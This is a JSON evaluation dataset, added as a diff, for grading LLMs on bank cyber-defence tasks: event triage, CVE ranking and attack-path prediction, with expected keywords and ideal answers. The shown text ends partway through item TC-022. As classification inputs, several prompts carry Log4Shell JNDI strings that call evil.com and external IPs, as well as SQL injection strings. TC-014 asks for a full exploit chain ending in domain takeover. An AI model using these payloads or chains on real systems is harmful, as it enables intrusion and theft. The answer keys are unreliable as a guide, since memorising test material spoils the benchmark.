@@ -1,0 +1,1427 @@
+{
+  "metadata": {
+    "title": "AI Cyber Defence System — Model Evaluation Dataset",
+    "version": "3.0",
+    "description": "Complete rewrite. Tests 3 models across 2 platforms: llama-3.1-8b-instant (Groq), DeepSeek V3.2 685B (NVIDIA NIM), Nemotron-3-Super 120B (NVIDIA NIM). 80 test cases covering all 12 PS requirements plus new V3 architecture tasks.",
+    "total_cases": 80,
+    "platforms": {
+      "groq": ["llama-3.1-8b-instant"],
+      "nvidia_nim": ["deepseek-v3.2", "nemotron-3-super-120b-a12b", "nemotron-content-safety-reasoning-4b"]
+    },
+    "model_routing_rules": {
+      "llama-3.1-8b-instant": "Pre-filter triage, WebSocket event classification, real-time threat scoring, dashboard chat — high volume, free tier",
+      "deepseek-v3.2": "Attack path analysis, remediation playbook generation, root cause analysis, threat landscape reports — complex reasoning",
+      "nemotron-3-super-120b-a12b": "Red team simulation, MITRE ATT&CK kill chains, agentic multi-phase planning — 1M context",
+      "nemotron-content-safety-reasoning-4b": "Verify that generated playbooks will not cause system damage — safety layer"
+    },
+    "categories": [
+      "pre_filter_triage",
+      "vulnerability_analysis",
+      "network_topology",
+      "attack_path_analysis",
+      "kill_switch_playbook",
+      "incident_response",
+      "root_cause_analysis",
+      "config_recommendations",
+      "threat_landscape",
+      "red_team_mitre",
+      "defense_gap",
+      "safety_verification",
+      "websocket_classification",
+      "real_time_scoring"
+    ],
+    "difficulty_breakdown": { "easy": 20, "medium": 32, "hard": 28 },
+    "ps_coverage": {
+      "PS#1_threat_landscape": 6,
+      "PS#2_vulnerability_analysis": 12,
+      "PS#3_network_topology": 6,
+      "PS#4_historical_incidents": 4,
+      "PS#5_attack_prediction": 12,
+      "PS#6_defensive_measures": 4,
+      "PS#7_remediation_playbooks": 10,
+      "PS#8_incident_response": 7,
+      "PS#9_root_cause_analysis": 6,
+      "PS#10_config_fixes": 5,
+      "PS#11_attack_simulation": 8,
+      "PS#12_defense_gaps": 5
+    },
+    "scoring": {
+      "per_case": "3 = full (80%+ keywords), 1 = partial (50-79%), 0 = fail (<50%)",
+      "max_score": 240,
+      "grade_bands": {
+        "excellent": "216-240 (90%+) — use confidently",
+        "good": "192-215 (80-89%) — use with prompt tuning",
+        "average": "144-191 (60-79%) — simple tasks only",
+        "poor": "below 144 (<60%) — do not use"
+      }
+    },
+    "how_to_use": "Send each prompt to the model listed in model_target. Score response against expected_keywords_in_response. Record score per case. Compare totals across models."
+  },
+
+  "test_cases": [
+
+    {
+      "id": "TC-001",
+      "category": "pre_filter_triage",
+      "difficulty": "easy",
+      "ps_requirement": "PS#5",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a security triage system for a bank. Analyze this event and respond in JSON only. No explanation outside JSON.\n\nEvent: {\"type\": \"login_attempt\", \"user\": \"employee_44\", \"ip\": \"10.0.0.1\", \"result\": \"success\", \"time\": \"09:15 AM\", \"day\": \"Monday\"}\n\nRespond: {\"suspicious\": bool, \"confidence\": 0.0-1.0, \"reason\": \"one line\", \"escalate\": bool}",
+      "expected_keywords_in_response": ["suspicious", "false", "confidence", "escalate", "normal", "internal", "business hours"],
+      "evaluation_criteria": {
+        "accuracy": "Must return suspicious: false — internal IP, business hours, successful login is normal",
+        "format": "Must respond in valid JSON only with all 4 fields",
+        "speed_suitability": "Concise — this is a fast triage task"
+      },
+      "ideal_answer_summary": "suspicious: false, confidence: 0.92, reason: normal business hours login from internal IP, escalate: false"
+    },
+
+    {
+      "id": "TC-002",
+      "category": "pre_filter_triage",
+      "difficulty": "easy",
+      "ps_requirement": "PS#5",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a security triage system for a bank. Analyze this event and respond in JSON only.\n\nEvent: {\"type\": \"login_attempt\", \"user\": \"admin\", \"ip\": \"185.220.101.45\", \"result\": \"failed\", \"attempts\": 95, \"time\": \"02:47 AM\"}\n\nRespond: {\"suspicious\": bool, \"confidence\": 0.0-1.0, \"reason\": \"one line\", \"escalate\": bool}",
+      "expected_keywords_in_response": ["suspicious", "true", "confidence", "escalate", "brute force", "2AM", "external", "95"],
+      "evaluation_criteria": {
+        "accuracy": "Must return suspicious: true, escalate: true",
+        "format": "Valid JSON only",
+        "reasoning": "Must flag off-hours, high attempts, external IP"
+      },
+      "ideal_answer_summary": "suspicious: true, confidence: 0.98, reason: 95 failed admin logins at 2:47AM from external IP = brute force, escalate: true"
+    },
+
+    {
+      "id": "TC-003",
+      "category": "pre_filter_triage",
+      "difficulty": "medium",
+      "ps_requirement": "PS#5",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a security triage system for a bank. Analyze this event and respond in JSON only.\n\nEvent: {\"type\": \"api_call\", \"endpoint\": \"/api/account/balance\", \"user\": \"cust_7821\", \"calls_per_minute\": 380, \"normal_baseline\": 2, \"ip\": \"45.33.22.11\"}\n\nRespond: {\"suspicious\": bool, \"confidence\": 0.0-1.0, \"reason\": \"one line\", \"escalate\": bool}",
+      "expected_keywords_in_response": ["suspicious", "true", "380", "automated", "scraping", "baseline", "escalate"],
+      "evaluation_criteria": {
+        "accuracy": "Must flag 190x above baseline as highly suspicious",
+        "format": "Valid JSON only",
+        "reasoning": "Must identify automated scraping pattern"
+      },
+      "ideal_answer_summary": "suspicious: true, confidence: 0.96, reason: 380 calls/min vs baseline 2 = automated account balance scraping, escalate: true"
+    },
+
+    {
+      "id": "TC-004",
+      "category": "pre_filter_triage",
+      "difficulty": "medium",
+      "ps_requirement": "PS#4",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a security triage system. Classify MULTIPLE events quickly. Respond with JSON array only.\n\nEvents:\n1. {\"type\": \"file_read\", \"file\": \"/etc/passwd\", \"user\": \"www-data\"}\n2. {\"type\": \"scheduled_job\", \"command\": \"db_backup.sh\", \"time\": \"01:00 AM\", \"user\": \"backup_svc\"}\n3. {\"type\": \"outbound_tcp\", \"dest_ip\": \"185.220.101.45\", \"port\": 4444, \"process\": \"java\"}\n4. {\"type\": \"login\", \"user\": \"sarah\", \"ip\": \"10.0.0.5\", \"time\": \"10:30 AM\"}\n\nFor each: {\"id\": 1-4, \"escalate\": bool, \"reason\": \"brief\"}",
+      "expected_keywords_in_response": ["id", "escalate", "/etc/passwd", "4444", "Metasploit", "C2", "true", "false", "backup"],
+      "evaluation_criteria": {
+        "accuracy": "Must escalate 1 and 3, not 2 and 4",
+        "format": "Valid JSON array",
+        "triage": "Port 4444 = Metasploit default, /etc/passwd via web process = web shell indicator"
+      },
+      "ideal_answer_summary": "1: escalate true (www-data reading /etc/passwd = web shell). 2: false (routine backup). 3: escalate true CRITICAL (java to 4444 = Metasploit C2). 4: false (normal login)."
+    },
+
+    {
+      "id": "TC-005",
+      "category": "pre_filter_triage",
+      "difficulty": "hard",
+      "ps_requirement": "PS#5",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a security triage system. This event looks benign but may not be. Analyze carefully and respond in JSON only.\n\nEvent: {\"type\": \"file_download\", \"user\": \"emp_221\", \"file\": \"customer_list_Q1_2026.xlsx\", \"size_mb\": 12.4, \"destination\": \"personal_gmail_attachment\", \"time\": \"17:52\", \"day\": \"Friday\", \"employee_notice\": \"resignation_submitted_yesterday\"}\n\nRespond: {\"suspicious\": bool, \"confidence\": 0.0-1.0, \"reason\": \"one line\", \"escalate\": bool}",
+      "expected_keywords_in_response": ["suspicious", "true", "insider threat", "resignation", "Friday", "personal email", "customer data", "escalate"],
+      "evaluation_criteria": {
+        "accuracy": "Must flag as suspicious despite appearing routine",
+        "nuance": "Must connect resignation + customer data + personal email as insider threat pattern",
+        "format": "Valid JSON"
+      },
+      "ideal_answer_summary": "suspicious: true, confidence: 0.92, reason: resigning employee exfiltrating customer data to personal email on Friday = insider threat, escalate: true"
+    },
+
+    {
+      "id": "TC-006",
+      "category": "pre_filter_triage",
+      "difficulty": "hard",
+      "ps_requirement": "PS#5",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a security triage system. Batch triage these 5 events. Respond JSON array only.\n\n1. {\"event\": \"User-Agent: ${jndi:ldap://45.33.22.11/x} in HTTP header\"}\n2. {\"event\": \"GET /admin/config.php HTTP 200 from 192.168.1.5\"}\n3. {\"event\": \"SELECT * FROM users WHERE id=1 OR 1=1 in query log\"}\n4. {\"event\": \"ICMP ping sweep 10.0.0.1-254 from 10.0.0.99 at 03:00 AM\"}\n5. {\"event\": \"Employee accessed HR portal from usual workstation at 14:00\"}\n\nFor each: {\"id\": 1-5, \"threat\": \"threat name\", \"severity\": \"low/medium/high/critical\", \"escalate\": bool}",
+      "expected_keywords_in_response": ["Log4Shell", "JNDI", "critical", "SQL injection", "ping sweep", "reconnaissance", "admin config", "false", "true"],
+      "evaluation_criteria": {
+        "accuracy": "1=Log4Shell/critical/true, 2=suspicious/high/true, 3=SQLi/critical/true, 4=recon/high/true, 5=normal/low/false",
+        "format": "Valid JSON array with all required fields",
+        "triage_quality": "Must correctly differentiate all 5 threat levels"
+      },
+      "ideal_answer_summary": "1: Log4Shell critical true. 2: Config exposure high true. 3: SQL injection critical true. 4: Internal recon high true. 5: Normal low false."
+    },
+
+    {
+      "id": "TC-007",
+      "category": "websocket_classification",
+      "difficulty": "easy",
+      "ps_requirement": "PS#1",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a real-time dashboard event classifier. A log line just arrived via the WebSocket stream. Classify it for the UI alert feed and respond in JSON only.\n\nLog: \"2026-03-14 22:04:11 WARN Failed authentication for user 'sa' from 185.220.101.45 — attempt 3\"\n\nRespond: {\"event_type\": str, \"severity\": \"low|medium|high|critical\", \"display_message\": str, \"alert_color\": \"green|yellow|orange|red\", \"escalate\": bool}",
+      "expected_keywords_in_response": ["event_type", "severity", "high", "display_message", "red", "escalate", "true", "sa", "authentication"],
+      "evaluation_criteria": {
+        "accuracy": "'sa' (SQL Server admin) from external IP = high/critical",
+        "format": "Valid JSON with all 5 fields",
+        "display_message": "Must be human-readable for dashboard"
+      },
+      "ideal_answer_summary": "event_type: auth_failure, severity: high, display_message: Admin login attempt from external IP 185.220.101.45, alert_color: red, escalate: true"
+    },
+
+    {
+      "id": "TC-008",
+      "category": "websocket_classification",
+      "difficulty": "medium",
+      "ps_requirement": "PS#1",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a real-time dashboard event classifier. Classify these 4 log lines for the WebSocket alert feed. Respond JSON array only.\n\n1. \"GET /robots.txt HTTP/1.1 200 from 45.33.22.11\"\n2. \"POST /login username=admin' OR '1'='1 HTTP 500\"\n3. \"GET /account?id=1003 user=cust_440 HTTP 200\" (user is cust_440, account 1003 belongs to cust_999)\n4. \"java.lang.RuntimeException: ${jndi:ldap://evil.com/exploit} in X-Forwarded-For\"\n\nFor each: {\"log_id\": int, \"threat\": str, \"severity\": str, \"alert_color\": str, \"escalate\": bool}",
+      "expected_keywords_in_response": ["log_id", "SQL injection", "Log4Shell", "JNDI", "critical", "IDOR", "recon", "red", "orange", "yellow"],
+      "evaluation_criteria": {
+        "accuracy": "1=recon/low/yellow/false, 2=SQLi/critical/red/true, 3=IDOR/high/orange/true, 4=Log4Shell/critical/red/true",
+        "format": "Valid JSON array",
+        "completeness": "All 4 classified correctly"
+      },
+      "ideal_answer_summary": "1: recon yellow false. 2: SQL injection red critical true. 3: IDOR orange high true. 4: Log4Shell red critical true."
+    },
+
+    {
+      "id": "TC-009",
+      "category": "real_time_scoring",
+      "difficulty": "medium",
+      "ps_requirement": "PS#1",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a real-time threat scoring engine for a bank security dashboard. Update the threat score based on a new event and respond in JSON only.\n\nCurrent state: {\"threat_score\": 32, \"active_incidents\": 0, \"critical_vulns\": 1}\nNew event: {\"type\": \"port_scan\", \"source_ip\": \"45.33.22.11\", \"ports_scanned\": 1450, \"duration_seconds\": 28, \"source\": \"external\"}\n\nRespond: {\"new_score\": int, \"delta\": int, \"reason\": str, \"alert_level\": \"safe|warning|critical\"}",
+      "expected_keywords_in_response": ["new_score", "delta", "port_scan", "reconnaissance", "alert_level", "warning", "1450 ports"],
+      "evaluation_criteria": {
+        "accuracy": "Score should increase 20-35 points — aggressive port scan from external = serious recon",
+        "format": "Valid JSON",
+        "reasoning": "Must explain score change clearly"
+      },
+      "ideal_answer_summary": "new_score: 62-67, delta: +30-35, reason: aggressive external port scan = active reconnaissance, alert_level: warning"
+    },
+
+    {
+      "id": "TC-010",
+      "category": "real_time_scoring",
+      "difficulty": "hard",
+      "ps_requirement": "PS#1",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a real-time threat scoring engine. Track score through an escalating event stream and respond in JSON only.\n\nStarting score: 25\nEvent stream (last 90 seconds):\nT+0s: {\"event\": \"Port scan from 185.220.101.45, 1200 ports\"}\nT+20s: {\"event\": \"50 failed logins on /admin from same IP\"}\nT+45s: {\"event\": \"ZAP web scanner signature detected on /login\"}\nT+72s: {\"event\": \"Successful admin login from 185.220.101.45\"}\n\nRespond: {\"timeline\": [{\"event\": str, \"score_after\": int}], \"final_score\": int, \"status\": str, \"immediate_action\": str}",
+      "expected_keywords_in_response": ["timeline", "score_after", "final_score", "critical", "90", "immediate_action", "block", "successful login", "status"],
+      "evaluation_criteria": {
+        "accuracy": "Final score must be 90+ after confirmed breach following recon pattern",
+        "completeness": "Must show score after each event",
+        "urgency": "Successful login after recon = confirmed breach, must trigger critical immediate action"
+      },
+      "ideal_answer_summary": "T+0: 55 (recon). T+20: 72 (brute force). T+45: 83 (active exploitation). T+72: 97 CRITICAL (breach). Final: 97. Immediate: Block IP + isolate admin panel NOW."
+    },
+
+    {
+      "id": "TC-011",
+      "category": "vulnerability_analysis",
+      "difficulty": "easy",
+      "ps_requirement": "PS#2",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nZAP scan result:\n{\"alert\": \"SQL Injection\", \"risk\": \"High\", \"url\": \"http://bank.altoro.com/login\", \"param\": \"username\", \"evidence\": \"1=1\", \"cweid\": \"89\"}\n\nExplain this vulnerability and its specific impact on a banking application. Include the attack mechanism and what data could be exposed.",
+      "expected_keywords_in_response": ["SQL injection", "database", "username", "CWE-89", "customer data", "authentication bypass", "attacker", "query manipulation"],
+      "evaluation_criteria": {
+        "accuracy": "Must correctly explain SQL injection mechanism via username parameter",
+        "banking_context": "Must relate to banking data exposure — account numbers, customer records",
+        "completeness": "Must cover attack mechanism and data exposure"
+      },
+      "ideal_answer_summary": "SQL injection on login via username parameter allows attacker to manipulate DB queries, bypass authentication, and dump entire customer database including account numbers and transaction history."
+    },
+
+    {
+      "id": "TC-012",
+      "category": "vulnerability_analysis",
+      "difficulty": "medium",
+      "ps_requirement": "PS#2",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nNessus scan results for host 10.0.0.5:\n[\n  {\"cve\": \"CVE-2021-44228\", \"severity\": \"Critical\", \"cvss\": 10.0, \"service\": \"Apache Log4j\", \"port\": 8080},\n  {\"cve\": \"CVE-2022-22965\", \"severity\": \"Critical\", \"cvss\": 9.8, \"service\": \"Spring Framework\", \"port\": 8080},\n  {\"cve\": \"CVE-2019-0708\", \"severity\": \"Critical\", \"cvss\": 9.8, \"service\": \"RDP\", \"port\": 3389}\n]\n\nRank these by exploitation priority for a banking environment and explain the blast radius of each.",
+      "expected_keywords_in_response": ["Log4Shell", "CVE-2021-44228", "remote code execution", "Spring4Shell", "BlueKeep", "RDP", "blast radius", "wormable", "priority", "CVSS 10"],
+      "evaluation_criteria": {
+        "accuracy": "Must correctly identify Log4Shell as highest priority (CVSS 10, widely exploited)",
+        "completeness": "Must explain blast radius for each CVE",
+        "ranking": "Must provide justified ranking with reasons"
+      },
+      "ideal_answer_summary": "1. Log4Shell (CVSS 10, RCE, actively exploited). 2. BlueKeep (wormable, lateral spread risk). 3. Spring4Shell (RCE but requires specific conditions). All need emergency patching."
+    },
+
+    {
+      "id": "TC-013",
+      "category": "vulnerability_analysis",
+      "difficulty": "medium",
+      "ps_requirement": "PS#2",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nZAP scan results on banking transfer endpoint:\n[\n  {\"alert\": \"CSRF\", \"risk\": \"High\", \"url\": \"/transfer\", \"method\": \"POST\"},\n  {\"alert\": \"Insecure Cookie\", \"risk\": \"Medium\", \"param\": \"JSESSIONID\", \"evidence\": \"no HttpOnly, no Secure flag\"}\n]\n\nExplain how these two vulnerabilities combine for a financial attack on bank customers.",
+      "expected_keywords_in_response": ["CSRF", "session cookie", "HttpOnly", "Secure flag", "forged request", "transfer funds", "combined attack", "victim", "XSS", "steal cookie"],
+      "evaluation_criteria": {
+        "accuracy": "Must explain how CSRF + insecure cookie enables unauthorised fund transfer",
+        "completeness": "Must describe full combined attack scenario",
+        "banking_context": "Must relate to financial theft from customer accounts"
+      },
+      "ideal_answer_summary": "Steal JSESSIONID via XSS (no HttpOnly). Use cookie to forge authenticated POST /transfer request (no CSRF token). Victim's account drained without knowledge. Combined risk: critical."
+    },
+
+    {
+      "id": "TC-014",
+      "category": "vulnerability_analysis",
+      "difficulty": "hard",
+      "ps_requirement": "PS#2",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nMulti-tool combined findings:\nnmap: {\"host\": \"10.0.0.5\", \"ports\": [22, 80, 443, 3389, 3306]}\nNessus: [{\"cve\": \"CVE-2017-0144\", \"name\": \"EternalBlue\", \"host\": \"10.0.0.5\", \"port\": 445}, {\"cve\": \"CVE-2020-1472\", \"name\": \"Zerologon\", \"host\": \"10.0.0.2\", \"service\": \"Netlogon\"}]\nZAP: [{\"alert\": \"SQL Injection\", \"url\": \"/login\"}, {\"alert\": \"SSRF\", \"url\": \"/fetch?url=\"}]\n\nAll are weaponised with public exploits. Construct the most dangerous combined attack scenario using all findings.",
+      "expected_keywords_in_response": ["EternalBlue", "Zerologon", "domain admin", "SSRF", "AWS metadata", "SQL injection", "combined", "chain", "full network compromise", "domain controller"],
+      "evaluation_criteria": {
+        "accuracy": "Must chain vulnerabilities logically — SQLi or SSRF for initial, EternalBlue for lateral, Zerologon for domain compromise",
+        "completeness": "Must use findings from all 3 tools",
+        "sophistication": "Must demonstrate understanding of how vulnerabilities chain together for maximum impact"
+      },
+      "ideal_answer_summary": "SSRF → AWS metadata credential theft → internal access → EternalBlue lateral movement → Zerologon = instant domain admin = entire network. Or: SQLi → DB creds → internal auth → same endpoint."
+    },
+
+    {
+      "id": "TC-015",
+      "category": "vulnerability_analysis",
+      "difficulty": "hard",
+      "ps_requirement": "PS#2",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nSpiderFoot OSINT findings:\n{\"findings\": [\n  {\"type\": \"LEAKED_CREDS\", \"data\": \"5 staff credentials in HaveIBeenPwned\", \"emails\": [\"admin@altoro.com\", \"cfo@altoro.com\"]},\n  {\"type\": \"DARKWEB_MENTION\", \"data\": \"altoro.com credentials for sale on dark web forum, posted 8 hours ago\"},\n  {\"type\": \"PHISHING_KIT\", \"data\": \"altoro.com branded phishing kit found on GitHub\"},\n  {\"type\": \"SUBDOMAIN\", \"data\": \"admin.altoro.com resolves to unregistered asset 10.0.0.99\"}\n]}\n\nAssess the combined threat from these OSINT findings. Is an attack imminent?",
+      "expected_keywords_in_response": ["imminent", "phishing kit", "dark web", "admin credentials", "CFO", "shadow IT", "high confidence", "8 hours", "active campaign", "unregistered asset"],
+      "evaluation_criteria": {
+        "accuracy": "Must assess as high-confidence imminent attack",
+        "completeness": "Must address all 4 OSINT findings",
+        "intelligence": "Must connect phishing kit + leaked creds + dark web listing as coordinated campaign"
+      },
+      "ideal_answer_summary": "High confidence imminent attack. Phishing kit + dark web creds + 8-hour window = active campaign in preparation. Admin and CFO credentials exposed = targeted access. Unregistered subdomain = shadow IT attack surface. Attack expected within 24 hours."
+    },
+
+    {
+      "id": "TC-016",
+      "category": "network_topology",
+      "difficulty": "easy",
+      "ps_requirement": "PS#3",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nnmap scan result for subnet 10.0.0.0/24:\n{\"hosts\": [\n  {\"ip\": \"10.0.0.5\", \"hostname\": \"web-server\", \"ports\": [{\"port\": 80}, {\"port\": 443}]},\n  {\"ip\": \"10.0.0.8\", \"hostname\": \"app-server\", \"ports\": [{\"port\": 8080}]},\n  {\"ip\": \"10.0.0.10\", \"hostname\": \"db-server\", \"ports\": [{\"port\": 3306}]}\n]}\n\nDescribe the network topology and identify which assets are dangerously exposed.",
+      "expected_keywords_in_response": ["three-tier", "web server", "application server", "database", "3306", "MySQL", "exposed", "internet-facing", "topology"],
+      "evaluation_criteria": {
+        "accuracy": "Must correctly identify 3-tier architecture and DB port exposure",
+        "completeness": "Must flag MySQL 3306 as critical exposure",
+        "clarity": "Must clearly distinguish internet-facing vs internal assets"
+      },
+      "ideal_answer_summary": "Three-tier architecture. Web server internet-facing (acceptable). DB port 3306 should never be internet accessible. App server should be internal only. Critical risk: database directly reachable."
+    },
+
+    {
+      "id": "TC-017",
+      "category": "network_topology",
+      "difficulty": "medium",
+      "ps_requirement": "PS#3",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nnmap scan discovered unexpected hosts in the VPC:\n{\"known_assets\": [\"10.0.0.5\", \"10.0.0.8\", \"10.0.0.10\"],\n \"discovered\": [\n   {\"ip\": \"10.0.0.99\", \"os\": \"Linux ARM (Raspberry Pi)\", \"ports\": [22, 80]},\n   {\"ip\": \"10.0.0.150\", \"ports\": [{\"port\": 4444, \"service\": \"unknown\"}]}\n]}\n\nAnalyse these two unknown hosts and what they represent.",
+      "expected_keywords_in_response": ["rogue device", "Raspberry Pi", "unauthorized", "4444", "Metasploit", "C2", "command and control", "isolate", "physical security", "active compromise"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify 4444 as Metasploit default C2 port",
+        "urgency": "10.0.0.150:4444 = ACTIVE COMPROMISE INDICATOR — must be treated as critical",
+        "completeness": "Must flag both hosts as suspicious for different reasons"
+      },
+      "ideal_answer_summary": "10.0.0.99 (Raspberry Pi) = rogue/unauthorized device, possible insider or IoT breach. 10.0.0.150:4444 = ACTIVE Metasploit C2 channel = network is likely already compromised. Isolate both immediately."
+    },
+
+    {
+      "id": "TC-018",
+      "category": "network_topology",
+      "difficulty": "hard",
+      "ps_requirement": "PS#3",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nnmap OS and service fingerprint for all VPC hosts:\n{\"hosts\": [\n  {\"ip\": \"10.0.0.5\", \"os\": \"Windows Server 2008 R2\", \"services\": [\"IIS 6.0\", \"SMB port 445\"]},\n  {\"ip\": \"10.0.0.8\", \"os\": \"CentOS 6.5\", \"services\": [\"Apache 2.2\", \"PHP 5.3\"]},\n  {\"ip\": \"10.0.0.10\", \"os\": \"Ubuntu 14.04\", \"services\": [\"MySQL 5.5\"]}\n]}\n\nAll three OS versions are end-of-life. Assess the specific risks and build an upgrade roadmap.",
+      "expected_keywords_in_response": ["end of life", "EternalBlue", "MS17-010", "WannaCry", "CentOS 6", "Ubuntu 14.04", "no patches", "CVE", "upgrade roadmap", "emergency"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify all 3 as EOL with specific known exploits",
+        "completeness": "Must give upgrade path for each system",
+        "urgency": "EOL + known wormable exploits = emergency situation"
+      },
+      "ideal_answer_summary": "All 3 EOL — no security patches. Windows 2008 + SMB = EternalBlue/WannaCry risk (wormable). CentOS 6.5 EOL Nov 2020. Ubuntu 14.04 EOL Apr 2019. Emergency: patch or isolate immediately. Upgrade: Windows Server 2022, CentOS Stream 9, Ubuntu 24.04."
+    },
+
+    {
+      "id": "TC-019",
+      "category": "attack_path_analysis",
+      "difficulty": "medium",
+      "ps_requirement": "PS#5",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nFlagged event (escalated from fast model): {\"type\": \"failed_login\", \"count\": 95, \"ip\": \"45.33.22.11\", \"target\": \"/admin\", \"confidence\": 0.97}\nFollow-up event: {\"type\": \"api_spike\", \"endpoint\": \"/api/account/balance\", \"calls_per_min\": 480, \"same_ip\": true}\n\nNetwork topology: Internet → Web Server (10.0.0.5) → App Server (10.0.0.8) → DB (10.0.0.10)\nMITRE ATT&CK context: T1110 (Brute Force), T1078 (Valid Accounts), T1530 (Data from Cloud Storage)\n\nPerform attack path analysis. Predict 3-step threat progression. Respond in structured JSON.",
+      "expected_keywords_in_response": ["attack_path", "step", "T1110", "T1078", "brute force", "credential", "api scraping", "risk_score", "confidence", "time_to_impact"],
+      "evaluation_criteria": {
+        "accuracy": "Must connect brute force → valid account → API data scraping as 3-step chain",
+        "format": "Structured JSON with attack_path array and MITRE references",
+        "mitre": "Must reference MITRE ATT&CK tactics and technique IDs"
+      },
+      "ideal_answer_summary": "Step 1: T1110 Brute Force admin login. Step 2: T1078 Valid Accounts — if successful, use credentials. Step 3: T1530 API scraping of account balances. Risk: 84. Time to impact: 6 minutes."
+    },
+
+    {
+      "id": "TC-020",
+      "category": "attack_path_analysis",
+      "difficulty": "hard",
+      "ps_requirement": "PS#5",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nTopology: Internet → LB → Web (10.0.0.5) → App (10.0.0.8) → Core DB (10.0.0.10)\nFindings: [\n  {\"vuln\": \"CVE-2021-44228 Log4Shell\", \"host\": \"10.0.0.5\", \"severity\": \"Critical\"},\n  {\"vuln\": \"CVE-2021-3156 Sudo privilege escalation\", \"host\": \"10.0.0.8\"},\n  {\"port\": 3306, \"host\": \"10.0.0.10\", \"accessible_from\": \"app-server\"}\n]\nLive event: {\"type\": \"JNDI_lookup\", \"source\": \"45.220.11.8\", \"pattern\": \"${jndi:ldap://45.220.11.8/x}\", \"time\": \"22:47\"}\n\nJNDI lookup detected. Attack may be in progress RIGHT NOW. Perform urgent attack path analysis.",
+      "expected_keywords_in_response": ["JNDI", "Log4Shell", "RCE", "sudo", "privilege escalation", "root", "database", "T1190", "T1068", "urgent", "in progress", "minutes", "isolate immediately"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify active Log4Shell exploitation in progress",
+        "urgency": "Must communicate attack chain will complete in minutes without intervention",
+        "completeness": "Full chain: Log4Shell RCE → sudo priv esc → DB access"
+      },
+      "ideal_answer_summary": "ACTIVE ATTACK: JNDI = Log4Shell exploitation NOW (T1190). Step 2: Sudo exploit on app server = root in <5 min (T1068). Step 3: DB dump via app server. Total compromise in 12-15 minutes. Isolate web server IMMEDIATELY."
+    },
+
+    {
+      "id": "TC-021",
+      "category": "attack_path_analysis",
+      "difficulty": "hard",
+      "ps_requirement": "PS#5",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nFull threat intelligence picture:\nnmap: {\"open_ports\": [22, 80, 443, 3306, 8080]}\nNessus: [{\"cve\": \"CVE-2022-22965\", \"severity\": \"Critical\"}, {\"cve\": \"CVE-2021-44228\", \"severity\": \"Critical\"}]\nZAP: [{\"alert\": \"CSRF\", \"url\": \"/transfer\"}, {\"alert\": \"Broken Auth\", \"url\": \"/admin\"}]\nSpiderFoot: [{\"type\": \"DARKWEB_MENTION\", \"data\": \"Bank targeted on dark web\"}, {\"type\": \"LEAKED_CREDS\", \"data\": \"3 staff emails in breach DB\"}]\nLogs: [{\"type\": \"port_scan\", \"source\": \"45.33.22.11\", \"timestamp\": \"yesterday\"}]\n\nIs an attack imminent? Predict the likely attack scenario with confidence rating.",
+      "expected_keywords_in_response": ["imminent", "dark web", "leaked credentials", "reconnaissance", "port scan", "Spring4Shell", "Log4Shell", "CSRF", "coordinated", "high confidence", "24 hours"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify all pre-attack indicators and connect them",
+        "completeness": "Must correlate all 4 tool outputs into unified threat picture",
+        "prediction": "Must give specific attack scenario with confidence rating"
+      },
+      "ideal_answer_summary": "High confidence imminent attack (0.91). Dark web targeting + leaked creds + port scan yesterday = active recon phase. Likely: credential stuffing → Spring4Shell/Log4Shell RCE → CSRF on /transfer for fund theft. Attack window: next 24 hours."
+    },
+
+    {
+      "id": "TC-022",
+      "category": "attack_path_analysis",
+      "difficulty": "hard",
+      "ps_requirement": "PS#5",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nIntelligence: {\"time\": \"Friday 17:45\", \"soc_staffing\": \"skeleton crew starts 18:00\", \"recon_pattern\": \"port scans Mon-Thur this week, increasing volume daily\", \"critical_cves_unpatched\": 2, \"similar_attack\": \"neighboring bank breached last Friday 19:00\"}\n\nPredict whether an attack is likely tonight and build the case for or against.",
+      "expected_keywords_in_response": ["Friday evening", "skeleton crew", "pattern", "escalating recon", "high probability", "tonight", "similar attack", "threat actor", "unpatched CVEs", "18:00"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify Friday + reduced SOC as attacker's preferred timing",
